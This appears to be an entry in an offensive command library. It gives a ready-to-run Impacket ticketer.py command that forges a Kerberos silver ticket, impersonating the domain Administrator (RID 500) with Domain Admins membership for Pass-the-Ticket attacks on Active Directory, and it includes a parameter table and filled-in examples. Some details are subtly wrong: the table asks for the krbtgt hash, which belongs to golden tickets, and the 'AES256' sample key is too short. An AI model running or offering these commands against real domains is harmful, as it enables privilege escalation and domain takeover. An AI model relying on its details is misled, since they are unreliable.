---
id: 84f8b7a7-a51f-4f83-b135-f79d62de05b7
name: ticketer-request-silver-ticket
type: command
executor: python
data: >-
  ticketer.py -request -domain '$_DOMAIN' -user '$_USER' -password '$_PASSWORD'
  -nthash '$_NTLM_HASH' -aesKey '$_AES_KEY' -domain-sid '$_DOMAIN_SID' -user-id
  '$_USER_RID' -groups '$_GROUP_RIDS' $_SERVICE
output: null
created_at: '2023-04-06T03:56:04.881767+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Windows
tags:
  - kerberos
  - forgery
verified: true
validated: true
---

# ticketer-request-silver-ticket

## Command

```python
ticketer.py -request -domain '$_DOMAIN' -user '$_USER' -password '$_PASSWORD' -nthash '$_NTLM_HASH' -aesKey '$_AES_KEY' -domain-sid '$_DOMAIN_SID' -user-id '$_USER_RID' -groups '$_GROUP_RIDS' $_SERVICE
```

## Description

This command uses Impacket's ticketer.py to forge a Silver Kerberos TGS ticket for a specified service and user, enabling offline ticket generation for Pass-the-Ticket attacks in Active Directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name (e.g., lab.local) | Yes |
| $_USER | Initial user for auth (can be any valid user) | Yes |
| $_PASSWORD | Password for initial user | Yes |
| $_NTLM_HASH | krbtgt NTLM hash (for RC4) | No (use with -nthash) |
| $_AES_KEY | krbtgt AES256 key (hex, for stronger encryption) | No (use with -aesKey) |
| $_DOMAIN_SID | Full domain SID (e.g., S-1-5-21-...) | Yes |
| $_USER_RID | RID of impersonated user (e.g., 500 for Admin) | Yes |
| $_GROUP_RIDS | Comma-separated group RIDs (e.g., 512,513 for Domain Admins) | Yes |
| $_SERVICE | Target service principal (e.g., cifs/dc.lab.local) | Yes |

## Examples

### Basic Usage

```python
ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash '31d6cfe0d16ae931b73c59d7e0c089c0' -domain-sid 'S-1-5-21-1234567890-1234567890-1234567890' -user-id '500' -groups '512' cifs/dc.lab.local
```

### Advanced Usage (with AES)

```python
ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey '0123456789abcdef0123456789abcdef' -domain-sid 'S-1-5-21-...' -user-id '500' -groups '512,513' host/target.lab.local
```

## Expected Output

Generates a .ccache file (e.g., <service>.ccache) containing the forged TGS ticket. No console output beyond file creation confirmation. Verify with `klist` after loading.

## Related

- [[procedures/Pass-the-Ticket-with-Silver-Tickets]]
- [[commands/rubeus-diamond-forge-ticket]]
